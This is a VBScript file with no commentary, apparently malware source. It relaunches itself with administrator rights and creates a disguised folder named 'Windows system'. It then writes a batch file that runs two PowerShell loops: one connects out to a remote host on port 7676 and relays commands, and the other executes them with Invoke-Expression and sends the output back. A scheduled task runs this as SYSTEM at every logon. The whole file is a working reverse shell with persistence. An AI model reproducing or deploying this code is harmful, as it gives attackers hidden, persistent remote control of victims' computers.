If Not WScript.Arguments.Named.Exists("elevate") Then
  CreateObject("Shell.Application").ShellExecute WScript.FullName _
    , """" & WScript.ScriptFullName & """ /elevate", "", "runas", 1
  WScript.Quit
End If

Set objFSO=CreateObject("Scripting.FileSystemObject")
If objFSO.FileExists("C:\Program Files\Windows system\socket.bat") then
WScript.Quit 1

End If

Set oShell = WScript.CreateObject ("WScript.Shell")
oShell.run "cmd /c mkdir C:\""Program Files""\""Windows system"""
'oShell.run "cmd /c Type C:\""Program Files""\""Windows system""\socket.bat"

Set objFSO=CreateObject("Scripting.FileSystemObject")
outFile="c:\Program Files\Windows system\socket.bat"
Set objFile = objFSO.CreateTextFile(outFile,True)
objFile.WriteLine "start powershell -Command ""$FTPServer = '192.168.0.133';$FTPPort = '7676';$inputCounter = 0;$outputCounter = 0;$testConnection=0; while(1){    $tcpConnection = New-Object System.Net.Sockets.TcpClient($FTPServer, $FTPPort);    $tcpStream = $tcpConnection.GetStream();    $reader = New-Object System.IO.StreamReader($tcpStream);    $writer = New-Object System.IO.StreamWriter($tcpStream);    $writer.AutoFlush = $true;    $buffer = new-object System.Byte[] 1024;    $encoding = new-object System.Text.AsciiEncoding;            while ($tcpConnection.Connected) {        while ($tcpStream.DataAvailable -or $reader.Peek() -ne -1 ) {               $path = -join('C:\Program Files\Windows system\input', $inputCounter,'.txt');            Set-Content -Path $path -Value $reader.ReadLine();            $inputCounter+=1;        };                $pathOutput = -join('C:\Program Files\Windows system\output',$outputCounter,'.txt');        if(Test-Path $pathOutput){            $output = Get-Content $pathOutput;            if($output.length -ge 1){                Foreach($s in $output){                    $writer.WriteLine($s);                };              };            $outputCounter+=1;            Remove-Item $pathOutput;        };            start-sleep -Milliseconds 120;        $testConnection+=1;        if($testConnection -ge 48){            $writer.Write(':');            $testConnection=0;        }    };        $reader.Close();    $writer.Close();    $tcpConnection.Close();        start-sleep -Milliseconds 7000;}"""
objFile.WriteLine "start powershell -Command ""$counterInput = 0;$counterOutput = 0;while (1) {    $path = -join('C:\Program Files\Windows system\input',$counterInput, '.txt');        if(Test-Path $path){        $input = Get-Content $path;        if($input.length -ge 1){            $outputPath = -join('C:\Program Files\Windows system\output', $counterOutput, '.txt');            $output = Invoke-Expression $input;            $joinedOutput = '';            Foreach($s in $output){                $joinedOutput+= $s;                $joinedOutput+=[environment]::NewLine;            };            Set-Content -Path $outputPath -Value $joinedOutput;        };                $counterInput+=1;        $counterOutput+=1;        Remove-Item $path;    };            start-sleep -Milliseconds 120;};"""
objFile.Close

oShell.run "schtasks /create /F /ru ""SYSTEM"" /sc onlogon /tn BatSocket /rl highest /tr \C:\Program Files\Windows system\socket.bat\"
oShell.run "schtasks /run /I /TN BatSocket"